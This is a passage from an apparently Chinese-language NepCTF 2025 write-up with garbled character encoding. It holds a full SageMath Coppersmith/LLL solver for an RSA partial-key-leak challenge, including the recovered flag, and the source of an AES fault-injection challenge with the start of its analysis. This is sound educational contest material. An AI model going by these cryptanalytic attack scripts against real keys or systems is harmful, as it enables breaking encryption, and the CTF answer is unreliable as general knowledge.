class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    e,N,hints = gen_parameters()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;e=<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(e)&#125;</span>&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;N=<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(N)&#125;</span>\n&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;hints=<span class="hljs-subst">&#123;hints&#125;</span>\n&#x27;</span>)<br>    <br>    flag_prefix = <span class="hljs-string">b&#x27;NepCTF&#123;&#x27;</span><br>    <span class="hljs-keyword">assert</span> flag.startswith(flag_prefix)<br>    <span class="hljs-keyword">assert</span> flag.endswith(<span class="hljs-string">b&#x27;&#125;&#x27;</span>)<br>    <br>    pt = bytes_to_long(flag[<span class="hljs-built_in">len</span>(flag_prefix):-<span class="hljs-number">1</span>])<br>    ct = <span class="hljs-built_in">pow</span>(pt, e, N)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;ct=<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(ct)&#125;</span>&#x27;</span>)<br>    <br>main()<br><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">e=0x73915608ed64c9cf1a2279684cab4f4a78fba229d45d4f860971a241481363470a19cb0dc0d00f816b5befdaca017cf71483e96ef17b36179012f5194a0e6bf481bb06c2644f74c6812efb65d05c00631f282d6aa55c0bc140a1830b95a1cf4b6024cb0db53f2c2189897c41f22e2eec773723f531ec4bfa537fae6de5fe480cf46fe17850f7eb47df08194d95db3d26ac923b26e110ee645239ab586bbc546ddc5906f280a106edbb727ccb05536b5a3f5c0ebcf865c95ce58be54f7f3547aa53baa218b0dfa98e42d925fa341e45f94a3b16b0c83802660c7f34de3336cb21f219073cf8e9f5e39d47f0a9a9ee7c255f09a6add9a2f7a47960f4a853183d29</span><br><span class="hljs-string">N=0xba8956e81394f3f1265ca5d9c4ad1ab0078bb43c4b80a231ab2cc62246ae45f66a562252622aed2cbbfc08647ef2fec0f97a632bf2242845f4b3af0c427cec3d90f42e90278a5a0feeed0922a8cd2278074ac54e9cfc0e96ff68f8d8f266dd87dc1cc59c2895ec884de2022311767f6a9a7e0bd288c79620e28b83bb3c8d8ad1047c839d6ccf5544eaf434a5f00b951769ab3121298d04b63a162757beb3d49917cd0c9e02ee1ac29398c8130961d5a2f2833aba1e538edb7bb97071f40fae543d1622f0c9206c6d4d8abb2ac1b93ebfb603c2f3a909ede357ade4043550fe540d13a4e87db8d731fe130f15a43a1a00364f5da2d87f7b660c3a04e734218a11</span><br><span class="hljs-string"></span><br><span class="hljs-string">hints=[1, 3, 0, 3, 9, 16, 10, 14, 5, 11, 21, 18, 30, 30, 38, 2, 20, 62, 66, 1, 22, 56, 41, 13, 78, 59, 51, 6, 57, 117, 73, 75, 96, 112, 50, 93, 158, 97, 146, 8, 65, 96, 186, 161, 90, 131, 46, 32, 140, 133, 50, 43, 151, 234]</span><br><span class="hljs-string"></span><br><span class="hljs-string">ct=0x101b284ad196b5bbd3d3df00a7d3577caeb29c681bdd122582b705afc671febf45d4f3786640e55aadd6a31ecc49175f97b772720f1735f8555f768b137a4643cd6958f80a3dfca4d0270ad463d6dde93429940bd2abb5ad8408b0906fa8d776544a1c50cc0d95939bef4c3fb64d0b52dca81ff0f244fc265bfc0bc147435d05f8f1a146e963a1403b3c123b4d6e73d1fd897109995009be1673212607f0ea7ae33d23f3158448b05c28ea6636382eee9436c4a6c09023ead7182ecd55ac73a68d458d726e1abc208810468591e63f4b4c2c1f3ce27c4800b52f7421ccab432c03e88b3b255740d719e40e0226eabb7633d97ed210e32071e2ac36ed17ef442e</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><h3 id="åˆ†æ-2"><a href="#åˆ†æ-2" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>é¢˜ä¸­ç»™å‡ºäº†$d$çš„ç”Ÿæˆç®—æ³•ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“$d\approx N^{0.33}$ï¼Œå’Œæˆ‘ä»¬ç†ŸçŸ¥çš„Boneh and Durfee attackçš„æ”»å‡»ä¸Šé™$N^{0.292}$è¿˜æœ‰äº›å·®è·ï¼Œä½†æ˜¯$hints$çš„æš´éœ²ä½¿å¾—æˆ‘ä»¬èƒ½å¤Ÿåˆ©ç”¨ä¸­å›½å‰©ä½™å®šç†æ±‚å‡º$d$çš„éƒ¨åˆ†ä½ä½$d_l$ï¼Œå¯ä»¥è¡¨ç¤ºä¸º$d&#x3D;d_hM+d_l$<br>å› ä¸ºæˆ‘ä»¬å·²çŸ¥äº†éƒ¨åˆ†ä½ä½ï¼Œå› æ­¤æˆ‘ä»¬çš„æ€è·¯å°½é‡å¾€coppersmithä¸Šè¾¹é ï¼Œç”±äºæ³„éœ²çš„æ˜¯$d_l$ï¼Œæˆ‘ä»¬é€‰çš„çš„å¤šé¡¹å¼ä¸ºï¼š$ed&#x3D;1+k\phi$<br>ç¨å¾®è°ƒæ•´ä¸€ä¸‹ï¼Œ<br>$e(d_hM+d_l)&#x3D;1+k(N-p-q+1)$<br>&#x3D;&gt;$d_heM &#x3D; 1+k(N-p-q+1)-ed_l$<br>ä¸¤è¾¹åŒæ—¶æ¨¡ä¸Š$eM$ï¼Œå¾—$0\equiv 1+k(N-p-q+1)-ed_l \mod eM$<br>è®¾$x&#x3D;kï¼Œy&#x3D;p+q$å¾—$f(x,y)\equiv 1+x(N-y+1)-ed_l \mod eM$<br>å¹¶ä¸”æˆ‘ä»¬å¯ä»¥ç®—å‡º$x\approx 2^{680}ï¼Œy\approx 2^{1024}$ç„¶åç›´æ¥æ‰“äºŒå…ƒcoppersmithå³å¯</p><h3 id="è§£ç­”-2"><a href="#è§£ç­”-2" class="headerlink" title="è§£ç­”"></a>è§£ç­”</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> itertools<br>e=<span class="hljs-number">0x73915608ed64c9cf1a2279684cab4f4a78fba229d45d4f860971a241481363470a19cb0dc0d00f816b5befdaca017cf71483e96ef17b36179012f5194a0e6bf481bb06c2644f74c6812efb65d05c00631f282d6aa55c0bc140a1830b95a1cf4b6024cb0db53f2c2189897c41f22e2eec773723f531ec4bfa537fae6de5fe480cf46fe17850f7eb47df08194d95db3d26ac923b26e110ee645239ab586bbc546ddc5906f280a106edbb727ccb05536b5a3f5c0ebcf865c95ce58be54f7f3547aa53baa218b0dfa98e42d925fa341e45f94a3b16b0c83802660c7f34de3336cb21f219073cf8e9f5e39d47f0a9a9ee7c255f09a6add9a2f7a47960f4a853183d29</span><br>N=<span class="hljs-number">0xba8956e81394f3f1265ca5d9c4ad1ab0078bb43c4b80a231ab2cc62246ae45f66a562252622aed2cbbfc08647ef2fec0f97a632bf2242845f4b3af0c427cec3d90f42e90278a5a0feeed0922a8cd2278074ac54e9cfc0e96ff68f8d8f266dd87dc1cc59c2895ec884de2022311767f6a9a7e0bd288c79620e28b83bb3c8d8ad1047c839d6ccf5544eaf434a5f00b951769ab3121298d04b63a162757beb3d49917cd0c9e02ee1ac29398c8130961d5a2f2833aba1e538edb7bb97071f40fae543d1622f0c9206c6d4d8abb2ac1b93ebfb603c2f3a909ede357ade4043550fe540d13a4e87db8d731fe130f15a43a1a00364f5da2d87f7b660c3a04e734218a11</span><br><br>hints=[<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">9</span>, <span class="hljs-number">16</span>, <span class="hljs-number">10</span>, <span class="hljs-number">14</span>, <span class="hljs-number">5</span>, <span class="hljs-number">11</span>, <span class="hljs-number">21</span>, <span class="hljs-number">18</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">38</span>, <span class="hljs-number">2</span>, <span class="hljs-number">20</span>, <span class="hljs-number">62</span>, <span class="hljs-number">66</span>, <span class="hljs-number">1</span>, <span class="hljs-number">22</span>, <span class="hljs-number">56</span>, <span class="hljs-number">41</span>, <span class="hljs-number">13</span>, <span class="hljs-number">78</span>, <span class="hljs-number">59</span>, <span class="hljs-number">51</span>, <span class="hljs-number">6</span>, <span class="hljs-number">57</span>, <span class="hljs-number">117</span>, <span class="hljs-number">73</span>, <span class="hljs-number">75</span>, <span class="hljs-number">96</span>, <span class="hljs-number">112</span>, <span class="hljs-number">50</span>, <span class="hljs-number">93</span>, <span class="hljs-number">158</span>, <span class="hljs-number">97</span>, <span class="hljs-number">146</span>, <span class="hljs-number">8</span>, <span class="hljs-number">65</span>, <span class="hljs-number">96</span>, <span class="hljs-number">186</span>, <span class="hljs-number">161</span>, <span class="hljs-number">90</span>, <span class="hljs-number">131</span>, <span class="hljs-number">46</span>, <span class="hljs-number">32</span>, <span class="hljs-number">140</span>, <span class="hljs-number">133</span>, <span class="hljs-number">50</span>, <span class="hljs-number">43</span>, <span class="hljs-number">151</span>, <span class="hljs-number">234</span>]<br><br>ct=<span class="hljs-number">0x101b284ad196b5bbd3d3df00a7d3577caeb29c681bdd122582b705afc671febf45d4f3786640e55aadd6a31ecc49175f97b772720f1735f8555f768b137a4643cd6958f80a3dfca4d0270ad463d6dde93429940bd2abb5ad8408b0906fa8d776544a1c50cc0d95939bef4c3fb64d0b52dca81ff0f244fc265bfc0bc147435d05f8f1a146e963a1403b3c123b4d6e73d1fd897109995009be1673212607f0ea7ae33d23f3158448b05c28ea6636382eee9436c4a6c09023ead7182ecd55ac73a68d458d726e1abc208810468591e63f4b4c2c1f3ce27c4800b52f7421ccab432c03e88b3b255740d719e40e0226eabb7633d97ed210e32071e2ac36ed17ef442e</span><br><br>m_list = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-built_in">len</span>(hints)+<span class="hljs-number">1</span>):<br>    m_list.append(sieve_base[i])<br>M = prod(m_list)<br>dl = crt(hints,m_list)%M<br><span class="hljs-comment">#print(dl)</span><br><span class="hljs-comment">#print(M)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">small_roots</span>(<span class="hljs-params">f, bounds, m=<span class="hljs-number">1</span>, d=<span class="hljs-literal">None</span></span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> d:<br>        d = f.degree()<br>        <span class="hljs-built_in">print</span>(d)<br>    R = f.base_ring()<br>    N = R.cardinality()<br>    <span class="hljs-comment">#f /= f.coefficients().pop(0)</span><br>    f = f.change_ring(ZZ)<br>    G = <span class="hljs-type">Sequence</span>([], f.parent())<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(m + <span class="hljs-number">1</span>):<br>        base = N ^ (m - i) * f ^ i<br>        <span class="hljs-keyword">for</span> shifts <span class="hljs-keyword">in</span> itertools.product(<span class="hljs-built_in">range</span>(d), repeat=f.nvariables()):<br>            g = base * prod(<span class="hljs-built_in">map</span>(power, f.variables(), shifts))<br>            G.append(g)<br>    B, monomials = G.coefficient_matrix()<br>    monomials = vector(monomials)<br>    factors = [monomial(*bounds) <span class="hljs-keyword">for</span> monomial <span class="hljs-keyword">in</span> monomials]<br>    <span class="hljs-keyword">for</span> i, factor <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(factors):<br>        B.rescale_col(i, factor)<br>    B = B.dense_matrix().LLL()<br>    B = B.change_ring(QQ)<br>    <span class="hljs-keyword">for</span> i, factor <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(factors):<br>        B.rescale_col(i, <span class="hljs-number">1</span> / factor)<br>    H = <span class="hljs-type">Sequence</span>([], f.parent().change_ring(QQ))<br>    <span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> <span class="hljs-built_in">filter</span>(<span class="hljs-literal">None</span>, B * monomials):<br>        H.append(h)<br>        I = H.ideal()<br>        <span class="hljs-keyword">if</span> I.dimension() == -<span class="hljs-number">1</span>:<br>            H.pop()<br>        <span class="hljs-keyword">elif</span> I.dimension() == <span class="hljs-number">0</span>:<br>            roots = []<br>            <span class="hljs-keyword">for</span> root <span class="hljs-keyword">in</span> I.variety(ring=ZZ):<br>                root = <span class="hljs-built_in">tuple</span>(R(root[var]) <span class="hljs-keyword">for</span> var <span class="hljs-keyword">in</span> f.variables())<br>                roots.append(root)<br>            <span class="hljs-keyword">return</span> roots<br>    <span class="hljs-keyword">return</span> []<br><br>R.&lt;x,y&gt; = PolynomialRing(Zmod(e*M))<br>f = <span class="hljs-number">1</span>+x*(N-y+<span class="hljs-number">1</span>)-e*dl<br>X = <span class="hljs-number">2</span>^<span class="hljs-number">680</span><br>Y = <span class="hljs-number">2</span>^<span class="hljs-number">1024</span><br>k,p_q = small_roots(f,(X,Y),<span class="hljs-number">2</span>,<span class="hljs-number">4</span>)[<span class="hljs-number">0</span>]   <span class="hljs-comment">#æ±‚ä¸å‡ºæ—¶è°ƒæ•´mï¼Œdçš„å‚æ•°å€¼</span><br>k,p_q = <span class="hljs-built_in">int</span>(k),<span class="hljs-built_in">int</span>(p_q)<br>phi = N - p_q +<span class="hljs-number">1</span><br>d = inverse(e,phi)<br>m = <span class="hljs-built_in">pow</span>(ct,d,N)<br>ans = long_to_bytes(m).decode()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;NepCTF&#123;&#123;<span class="hljs-subst">&#123;ans&#125;</span>&#125;&#125;&quot;</span>)<br><span class="hljs-comment">#NepCTF&#123;larg3r_M0du1u5_1nf0_g1ves_b3773r_b0und5&#125;</span><br></code></pre></td></tr></table></figure><h2 id="unloopshock"><a href="#unloopshock" class="headerlink" title="unloopshock"></a>unloopshock</h2><h3 id="é¢˜ç›®-3"><a href="#é¢˜ç›®-3" class="headerlink" title="é¢˜ç›®"></a><strong>é¢˜ç›®</strong></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> unicorn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> unicorn.x86_const <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> capstone <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> capstone.x86_const <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>flag = os.getenv(<span class="hljs-string">&#x27;FLAG&#x27;</span>,<span class="hljs-string">&#x27;test&#123;This_is_a_test_flag_connect_to_get_true_flag&#125;&#x27;</span>).encode()<br><br><br>CODE_COUNT = <span class="hljs-number">0</span><br>TARGET_COUNT = <span class="hljs-number">0</span><br><span class="hljs-comment"># memory address where emulation starts</span><br>CODE_ADDRESS    = <span class="hljs-number">0x110000</span><br>DATA_ADDRESS    = <span class="hljs-number">0x220000</span><br>KEY_ADDRESS     = <span class="hljs-number">0x440000</span><br>STACK_ADDRESS   = <span class="hljs-number">0x880000</span><br>CODE = <span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./src/prog_aes4&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    CODE = f.read()<br><br><br>ENTRY_POINT = CODE_ADDRESS + <span class="hljs-number">0x9E5</span><br>ENTRY_POINT_END = CODE_ADDRESS + <span class="hljs-number">0xF6F</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">flipBit</span>(<span class="hljs-params">uc:Uc,reg_name:<span class="hljs-built_in">str</span></span>):<br>    randBit = random.randint(<span class="hljs-number">0</span>,<span class="hljs-number">7</span>) <span class="hljs-comment">#not 0,63</span><br>    reg_num = <span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;UC_X86_REG_&quot;</span> + reg_name.upper())<br>    reg_value = uc.reg_read(reg_num)<br>    reg_value ^= <span class="hljs-number">1</span> &lt;&lt; randBit<br>    uc.reg_write(reg_num,reg_value)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">shock</span>(<span class="hljs-params">uc:Uc</span>):<br>    rip = uc.reg_read(UC_X86_REG_RIP)<br>    code = uc.mem_read(rip,<span class="hljs-number">16</span>)<br>    md = Cs(CS_ARCH_X86, CS_MODE_64)<br>    md.detail = <span class="hljs-literal">True</span><br>    dis = <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> md.disasm(code, <span class="hljs-number">0</span>):<br>        dis = d<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">for</span> reg_list <span class="hljs-keyword">in</span> dis.regs_access():<br>        <span class="hljs-keyword">for</span> reg <span class="hljs-keyword">in</span> reg_list:<br>            flipBit(uc,md.reg_name(reg))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hook_code</span>(<span class="hljs-params">uc:Uc, address, size, user_data</span>):<br>    <span class="hljs-keyword">global</span> CODE_COUNT<br>    <span class="hljs-keyword">if</span>(CODE_COUNT &gt;= <span class="hljs-number">2000000</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;   [â°] Time Limit Exceed&quot;</span>)<br>        uc.emu_stop()<br>    <span class="hljs-keyword">if</span>(CODE_COUNT == TARGET_COUNT):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;   [âš¡] Shock!&quot;</span>)<br>        shock(uc)<br>    CODE_COUNT += <span class="hljs-number">1</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">data,key,target</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;   [ğŸ”’] to enc: &quot;</span>,data.<span class="hljs-built_in">hex</span>())<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">global</span> CODE_COUNT<br>        <span class="hljs-keyword">global</span> TARGET_COUNT<br>        CODE_COUNT = <span class="hljs-number">0</span><br>        TARGET_COUNT = target<br>        <span class="hljs-comment"># Initialize emulator </span><br>        mu = Uc(UC_ARCH_X86, UC_MODE_64)<br><br>        <span class="hljs-comment"># map memory</span><br>        mu.mem_map(CODE_ADDRESS, <span class="hljs-number">2</span> * <span class="hljs-number">0x1000</span>) <span class="hljs-comment"># Code</span><br>        mu.mem_map(DATA_ADDRESS, <span class="hljs-number">1</span> * <span class="hljs-number">0x1000</span>) <span class="hljs-comment"># DATA</span><br>        mu.mem_map(KEY_ADDRESS, <span class="hljs-number">1</span> * <span class="hljs-number">0x1000</span>) <span class="hljs-comment"># KEY</span><br>        mu.mem_map(STACK_ADDRESS, <span class="hljs-number">2</span> * <span class="hljs-number">0x1000</span>) <span class="hljs-comment"># STACK</span><br>        <span class="hljs-comment"># write machine code to be emulated to memory</span><br><br>        mu.mem_write(CODE_ADDRESS, CODE)<br>        mu.mem_write(KEY_ADDRESS, key)<br>        mu.mem_write(DATA_ADDRESS, data)<br><br>        <span class="hljs-comment"># initialize machine registers</span><br>        mu.reg_write(UC_X86_REG_RIP, ENTRY_POINT)<br>        mu.reg_write(UC_X86_REG_RDI, DATA_ADDRESS)<br>        mu.reg_write(UC_X86_REG_RSI, <span class="hljs-number">16</span>)<br>        mu.reg_write(UC_X86_REG_RDX, KEY_ADDRESS)<br>        mu.reg_write(UC_X86_REG_RSP, STACK_ADDRESS + <span class="hljs-number">0x1000</span>)<br><br>        <span class="hljs-comment"># tracing all instructions with customized callback</span><br>        mu.hook_add(UC_HOOK_CODE, hook_code)<br><br>        <span class="hljs-comment"># emulate machine code in infinite time</span><br>        mu.emu_start(ENTRY_POINT, ENTRY_POINT_END)<br><br>        result = mu.mem_read(DATA_ADDRESS, <span class="hljs-number">16</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;   [â–¶ï¸] Result: &quot;</span>,result.<span class="hljs-built_in">hex</span>())<br><br>    <span class="hljs-keyword">except</span> UcError <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;   [ğŸ’¥] BOOM: %s&quot;</span> % e) <span class="hljs-comment"># https://www.bilibili.com/video/BV1ynKQzHEED</span><br>    <span class="hljs-keyword">return</span><br><br><br>AES_KEY = os.urandom(<span class="hljs-number">16</span>)<br>AES_PTS = <span class="hljs-string">b&#x27;&#x27;</span><br>Shocktime = <span class="hljs-number">9999999</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    count=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> count &lt; <span class="hljs-number">1</span>:<br>        count += <span class="hljs-number">1</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Round %d / 1&quot;</span>%(count))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Input your data: in hex(max 16 bytes)&quot;</span>)<br>        <span class="hljs-keyword">try</span>:<br>            AES_PTS = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">input</span>())[<span class="hljs-number">0</span>:<span class="hljs-number">16</span>]<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;wrong input!&quot;</span>)<br>            sys.exit(<span class="hljs-number">1</span>)<br>        Shocktime=<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;time to shock: &quot;</span>)<br>        <span class="hljs-keyword">try</span>:<br>            Shocktime=<span class="hljs-built_in">int</span>(Shocktime)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;wrong input!&quot;</span>)<br>            sys.exit(<span class="hljs-number">1</span>)<br>        run(AES_PTS,AES_KEY,Shocktime)    <br>        guesskey=<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;now give me your guess key: &quot;</span>)<br>        <span class="hljs-keyword">if</span> guesskey[<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;n&quot;</span>:<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">try</span>:<br>            guesskey=<span class="hljs-built_in">bytes</span>.fromhex(guesskey)[<span class="hljs-number">0</span>:<span class="hljs-number">16</span>]<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;wrong input!&quot;</span>)<br>            sys.exit(<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">if</span> guesskey==AES_KEY:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;FLAG:&quot;</span>,flag)<br>            sys.exit(<span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;No Second Chance&quot;</span>)<br>            sys.exit(<span class="hljs-number">1</span>)<br><br></code></pre></td></tr></table></figure><h3 id="åˆ†æ-3"><a href="#åˆ†æ-3" class="headerlink" title="åˆ†æ"></a><strong>åˆ†æ</strong></h3><p>æ•…éšœæ³¨å…¥æ”»å‡»ï¼Œåˆ†æé¢˜ç›®ï¼Œè·ŸMISCä¸­çš„<code>easyshock</code>æ¯”è¾ƒç›¸ä¼¼ï¼Œå…¶ä¸­çš„<code>shock</code>é€»è¾‘æ˜¯ä¸€æ ·çš„ï¼Œè¿™ä¸€é¢˜çš„äº¤äº’é€»è¾‘å’Œé¢˜ç›®éƒ½åœ¨æç¤ºæˆ‘ä»¬è·Ÿå¯†é’¥æ³„éœ²æœ‰å…³ï¼Œåªè¦æ±‚å‡º<code>key</code>æˆ‘ä»¬å°±èƒ½å¾—åˆ°<code>FLAG</code>ã€‚<br>ä½¿ç”¨IDAé€†å‘ä¸€ä¸‹<code>progaes4</code>ï¼Œå‘ç°æ˜¯AESåŠ å¯†ç®—æ³•ï¼Œé€ä¸ªåˆ†æå‡½æ•°ä¹‹åï¼Œå‘ç°å‡½æ•°<code>sub_1BC</code>æ§åˆ¶ç€å¯†é’¥æ‰©å±•é€»è¾‘ï¼Œæ ¹æ®æˆ‘ä»¬äº†è§£çš„AESç›¸å…³çŸ¥è¯†å¯ä»¥çŸ¥é“ï¼Œæ‰©å±•å¯†é’¥ç”±åä¸€ç»„ç»„æˆï¼Œæ¯ç»„ç”±4ä¸ª4å­—èŠ‚ç»„æˆï¼Œå…¶ä¸­ç¬¬ä¸€ç»„å°±æ˜¯åŸå§‹å¯†é’¥ã€‚<br><img src="/2025/07/25/NepCTF%202025%20Writeup/file-20250807234644320.png"><br>ç”±äºæˆ‘ä»¬å¯ä»¥è‡ªå®šä¹‰åŠ 